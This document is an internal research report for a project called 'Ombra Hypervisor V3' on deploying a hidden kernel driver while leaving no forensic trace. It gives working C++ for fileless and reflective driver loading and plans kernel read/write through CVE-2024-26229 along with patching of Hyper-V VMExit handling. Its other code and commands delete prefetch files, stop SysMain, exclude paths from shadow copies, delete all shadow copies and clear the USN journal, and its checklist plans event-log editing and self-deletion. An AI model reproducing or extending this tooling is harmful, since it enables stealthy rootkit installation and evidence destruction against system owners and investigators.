# Filesystem Artifact Elimination Research Report
**Project**: Ombra Hypervisor V3
**Research Focus**: Zero-footprint file deployment and NTFS artifact elimination
**Date**: December 24, 2025

---

## Executive Summary

This report documents techniques for achieving zero filesystem footprint during Ombra Hypervisor deployment. The goal is to eliminate all traces from MFT, USN Journal, $LogFile transaction logs, Prefetch, and other NTFS forensic artifacts.

**Key Finding**: Embedded resource extraction + IoCreateDriver API enables complete fileless driver loading, bypassing all filesystem forensics.

---

## 1. Current Filesystem Footprint

### 1.1 Artifacts Created by Current Implementation

| Artifact Type | Location | Created By | Forensic Value |
|---------------|----------|------------|----------------|
| **MFT Entry** | $MFT | File creation | HIGH - timestamps, size, name |
| **USN Journal** | $Extend\$UsnJrnl | File operations | HIGH - chronological log |
| **$LogFile** | $LogFile | NTFS transactions | MEDIUM - crash recovery data |
| **Prefetch** | C:\Windows\Prefetch | Process execution | HIGH - execution history |
| **Registry** | HKLM\SYSTEM\Services | NtLoadDriver | HIGH - service configuration |
| **Event Logs** | System log | SCM | MEDIUM - service events |
| **VSS Snapshots** | Shadow copies | Automatic | HIGH - historical state |

### 1.2 Files Currently Written

```
C:\Windows\System32\drivers\Ld9BoxSup.sys  (VBox support driver)
%TEMP%\OmbraDriver.sys                      (Hidden driver)
C:\Windows\Prefetch\OMBRALOADER.EXE-*.pf    (Execution trace)
```

---

## 2. Zero-Footprint Architecture

### 2.1 Embedded Resource Strategy

**Concept**: Embed drivers as encrypted RT_RCDATA resources within OmbraLoader.exe.

```cpp
// Resource embedding (build-time)
// resources.rc:
IDR_LDBOXSUP    RCDATA  "Ld9BoxSup_encrypted.bin"
IDR_OMBRA_DRV   RCDATA  "OmbraDriver_encrypted.bin"

// Resource extraction (runtime)
HRSRC hRes = FindResourceW(NULL, MAKEINTRESOURCEW(IDR_LDBOXSUP), RT_RCDATA);
HGLOBAL hData = LoadResource(NULL, hRes);
DWORD size = SizeofResource(NULL, hRes);
PVOID encryptedData = LockResource(hData);

// Decrypt in memory
std::vector<u8> decrypted = DriverCrypto::DecryptWithHeader(
    encryptedData, size, ENCRYPTION_KEY
);
```

### 2.2 IoCreateDriver Loading

**Concept**: Register driver object without NtLoadDriver, eliminating registry and file requirements.

```cpp
// IoCreateDriver signature
NTSTATUS IoCreateDriver(
    PUNICODE_STRING DriverName,    // NULL for anonymous driver
    PDRIVER_INITIALIZE InitRoutine // DriverEntry equivalent
);

// Usage pattern
typedef NTSTATUS (*DRIVER_INITIALIZE)(
    PDRIVER_OBJECT DriverObject,
    PUNICODE_STRING RegistryPath
);

NTSTATUS LoadDriverFileless(PVOID DriverImage, SIZE_T ImageSize) {
    // 1. Allocate kernel pool
    PVOID kernelBase = ExAllocatePoolWithTag(NonPagedPoolNx, ImageSize, 'sftN');

    // 2. Map PE sections
    MapPESections(DriverImage, kernelBase);

    // 3. Process relocations
    ProcessRelocations(kernelBase, (ULONG_PTR)kernelBase - preferredBase);

    // 4. Resolve imports
    ResolveImports(kernelBase);

    // 5. Get DriverEntry RVA
    PDRIVER_INITIALIZE driverEntry = (PDRIVER_INITIALIZE)(
        (PBYTE)kernelBase + ntHeaders->OptionalHeader.AddressOfEntryPoint
    );

    // 6. Call IoCreateDriver with NULL name
    NTSTATUS status = IoCreateDriver(NULL, driverEntry);

    // Driver is now registered with anonymous DRIVER_OBJECT
    // No registry entry, no file on disk
    return status;
}
```

### 2.3 Reflective Driver Loading

For scenarios where IoCreateDriver is unavailable or problematic:

```cpp
NTSTATUS ReflectiveLoad(PVOID DriverImage) {
    // 1. Allocate NonPagedPoolNx via zerohvci primitives
    PVOID pool = zerohvci::AllocateKernelPool(ImageSize, 'sftN');

    // 2. Manual PE mapping
    CopyHeaders(DriverImage, pool);
    CopySections(DriverImage, pool);
    ProcessRelocations(pool);
    ResolveImports(pool);

    // 3. Call DriverEntry directly (no IoCreateDriver)
    DRIVER_INITIALIZE entry = GetEntryPoint(pool);
    entry(NULL, NULL);  // NULL DriverObject, NULL RegistryPath

    // 4. Store callback address in vmxroot storage
    // Driver receives requests via hypercall, not IRP dispatch
    return STATUS_SUCCESS;
}
```

---

## 3. NTFS Artifact Elimination

### 3.1 MFT Timestamp Analysis

**$STANDARD_INFORMATION vs $FILE_NAME**:
- `$STANDARD_INFORMATION`: User-modifiable timestamps (easily timestomped)
- `$FILE_NAME`: Kernel-protected timestamps (harder to modify)

**Timestomping Detection**: Forensic tools compare these attributes. Mismatches indicate tampering.

**Best Strategy**: Don't create files at all (fileless deployment).

### 3.2 USN Journal Bypass

The USN Journal ($Extend\$UsnJrnl) records all file operations with millisecond timestamps.

**Bypass Methods**:

1. **Fileless Operation** (Recommended)
   - No files = no USN entries
   - Embedded resources never touch filesystem

2. **USN Journal Disabling** (Risky)
   ```cmd
   fsutil usn deletejournal /d C:
   ```
   - Creates obvious forensic gap
   - Triggers security monitoring alerts
   - NOT RECOMMENDED

3. **Direct Disk I/O** (Complex)
   - Bypass NTFS driver entirely
   - Write directly to raw sectors
   - Risk of filesystem corruption

### 3.3 $LogFile Transaction Avoidance

**Problem**: $LogFile records pending NTFS transactions for crash recovery.

**Avoidance**: Fileless loading inherently bypasses $LogFile entries since no file operations occur.

---

## 4. Prefetch Elimination

### 4.1 Prefetch File Structure

Windows Prefetch tracks application execution for performance optimization:

```
C:\Windows\Prefetch\OMBRALOADER.EXE-{HASH}.pf
```

**Contents**:
- Last 8 execution timestamps (Windows 10+)
- Run count
- Files and directories accessed
- DLLs loaded
- Volume information

### 4.2 Prefetch Cleanup

```cpp
void CleanupPrefetch() {
    WCHAR prefetchPath[MAX_PATH];
    ExpandEnvironmentStringsW(L"%SystemRoot%\\Prefetch", prefetchPath, MAX_PATH);

    WIN32_FIND_DATAW findData;
    WCHAR searchPattern[MAX_PATH];
    wsprintfW(searchPattern, L"%s\\OMBRALOADER*.pf", prefetchPath);

    HANDLE hFind = FindFirstFileW(searchPattern, &findData);
    if (hFind != INVALID_HANDLE_VALUE) {
        do {
            WCHAR fullPath[MAX_PATH];
            wsprintfW(fullPath, L"%s\\%s", prefetchPath, findData.cFileName);

            // Overwrite with random data before delete
            SecureDeleteFile(fullPath);

        } while (FindNextFileW(hFind, &findData));
        FindClose(hFind);
    }
}

void SecureDeleteFile(LPCWSTR path) {
    HANDLE hFile = CreateFileW(path, GENERIC_WRITE, 0, NULL,
                               OPEN_EXISTING, FILE_FLAG_DELETE_ON_CLOSE, NULL);
    if (hFile != INVALID_HANDLE_VALUE) {
        LARGE_INTEGER fileSize;
        GetFileSizeEx(hFile, &fileSize);

        // Overwrite with random bytes
        std::vector<BYTE> random(fileSize.LowPart);
        BCryptGenRandom(NULL, random.data(), random.size(), BCRYPT_USE_SYSTEM_PREFERRED_RNG);

        DWORD written;
        SetFilePointer(hFile, 0, NULL, FILE_BEGIN);
        WriteFile(hFile, random.data(), random.size(), &written, NULL);

        CloseHandle(hFile);  // FILE_FLAG_DELETE_ON_CLOSE triggers deletion
    }
}
```

### 4.3 Prefetch Service Manipulation

More aggressive approach - disable prefetch temporarily:

```cpp
// Stop Superfetch/SysMain service
SC_HANDLE scm = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
SC_HANDLE svc = OpenServiceW(scm, L"SysMain", SERVICE_ALL_ACCESS);
ControlService(svc, SERVICE_CONTROL_STOP, &status);

// Execute loader operations...

// Restart service
StartService(svc, 0, NULL);
```

---

## 5. Volume Shadow Copy Handling

### 5.1 VSS Exposure Risk

Volume Shadow Copies can preserve historical filesystem state, including:
- Deleted driver files
- Previous registry states
- Event logs before clearing

### 5.2 VSS Exclusion

Add registry keys to exclude sensitive paths from VSS:

```cpp
// Registry path for VSS exclusions
// HKLM\SYSTEM\CurrentControlSet\Control\BackupRestore\FilesNotToBackup

void ExcludeFromVSS(LPCWSTR path) {
    HKEY hKey;
    RegCreateKeyExW(
        HKEY_LOCAL_MACHINE,
        L"SYSTEM\\CurrentControlSet\\Control\\BackupRestore\\FilesNotToBackup",
        0, NULL, REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, NULL, &hKey, NULL
    );

    // Format: "path\*" for directory exclusion
    WCHAR exclusion[MAX_PATH];
    wsprintfW(exclusion, L"%s\\*\0", path);

    RegSetValueExW(hKey, L"OmbraExclusion", 0, REG_MULTI_SZ,
                   (LPBYTE)exclusion, (wcslen(exclusion) + 2) * sizeof(WCHAR));
    RegCloseKey(hKey);
}
```

### 5.3 VSS Snapshot Deletion

**WARNING**: Aggressive and creates forensic evidence.

```cpp
void DeleteVSSSnapshots() {
    // Using vssadmin
    system("vssadmin delete shadows /all /quiet");

    // Using WMI (stealthier)
    // Connect to Win32_ShadowCopy, enumerate and delete
}
```

---

## 6. Recommended Deployment Flow

```
┌─────────────────────────────────────────────────────────────┐
│                    ZERO-FOOTPRINT FLOW                       │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│  1. OmbraLoader.exe starts                                   │
│     └─► No files extracted yet                               │
│                                                              │
│  2. Extract Ld9BoxSup.sys from RT_RCDATA resource            │
│     └─► Decrypt in memory only                               │
│     └─► Never written to disk                                │
│                                                              │
│  3. ZeroHVCI: Gain kernel R/W via CVE-2024-26229             │
│     └─► Allocate NonPagedPoolNx                              │
│     └─► Manual map Ld9BoxSup.sys                             │
│     └─► IoCreateDriver(NULL, entry) - no registry            │
│                                                              │
│  4. RuntimeHijacker: Patch Hyper-V VMExit                    │
│     └─► PayLoad.dll now intercepts VMExits                   │
│                                                              │
│  5. Extract OmbraDriver.sys from RT_RCDATA                   │
│     └─► Decrypt in memory only                               │
│     └─► Map via VMCALL primitives                            │
│     └─► EPT shadow paging hides allocation                   │
│                                                              │
│  6. Cleanup phase                                            │
│     └─► Delete OmbraLoader.exe prefetch files                │
│     └─► Clear process creation events (optional)             │
│                                                              │
│  RESULT: Zero filesystem artifacts                           │
│  - No MFT entries for drivers                                │
│  - No USN Journal records                                    │
│  - No $LogFile transactions                                  │
│  - No registry service keys                                  │
│  - Prefetch cleaned                                          │
│                                                              │
└─────────────────────────────────────────────────────────────┘
```

---

## 7. Implementation Checklist

### Immediate (Phase 1)

- [ ] Embed Ld9BoxSup.sys as encrypted RT_RCDATA resource
- [ ] Embed OmbraDriver.sys as encrypted RT_RCDATA resource
- [ ] Implement DriverCrypto::DecryptWithHeader() for in-memory extraction
- [ ] Modify mapper::map_driver() to accept memory buffer instead of file path

### Short-term (Phase 2)

- [ ] Implement IoCreateDriver path for Ld9BoxSup.sys
- [ ] Add prefetch cleanup function post-execution
- [ ] Add VSS exclusion registry entries during deployment

### Long-term (Phase 3)

- [ ] Implement reflective loading as fallback
- [ ] Add self-deletion capability for loader executable
- [ ] Implement event log selective editing (surgical approach)

---

## 8. Detection Surface Comparison

| Artifact | Current Method | Fileless Method | Reduction |
|----------|---------------|-----------------|-----------|
| MFT Entries | 2+ entries | 0 entries | 100% |
| USN Journal | Multiple records | 0 records | 100% |
| Registry Keys | 1+ service keys | 0 keys | 100% |
| Prefetch | 1 file | 0 (cleaned) | 100% |
| Event Logs | 2-3 events | 0 events | 100% |
| VSS Exposure | HIGH | LOW (excluded) | ~90% |

---

## SOURCES

- [NTFS Forensic Analysis (SANS)](https://www.sans.org/white-papers/36707/)
- [Windows Prefetch Parser](https://github.com/libyal/libscca)
- [IoCreateDriver Documentation](https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-iocreatedriver)
- [Reflective Driver Loading](https://github.com/not-wlan/Reflective-Driver-Loader)
- [USN Journal Forensics](https://www.sciencedirect.com/topics/computer-science/usn-journal)
- [KDMapper Source Analysis](https://github.com/TheCruZ/kdmapper)
